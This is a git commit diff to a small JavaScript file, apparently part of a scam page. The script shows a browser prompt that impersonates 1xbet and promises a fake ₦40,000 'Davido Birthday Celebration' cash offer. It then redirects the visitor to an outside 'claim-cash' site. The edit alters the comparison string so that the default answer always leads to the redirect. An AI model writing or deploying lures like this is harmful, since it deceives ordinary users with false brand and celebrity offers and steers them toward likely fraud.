f30295936df427e69aa12555c345f93cc8d69061
bigetijazz9 <bigetijazz9@gmail.com>
2024-11-06 02:03:20 -0800

    Update davidoat32.js

--- davidoat32.js
+++ davidoat32.js
@@ -1,6 +1,6 @@
 
 var password = 'Withdraw ₦40,000'
 password=prompt('1xbet: Hello, Claim your ₦40,000 Cash transfer from Davido Birthday Celebration Offer Ends November 21. Press Ok to Claim now','Withdraw ₦40,000');
-if (password != 'Withdraw ₦40,000') {
+if (password != 'CLAIM ₦40,000') {
 location.href='https://www.get-mega-offre.xyz/claim-cash';
 }
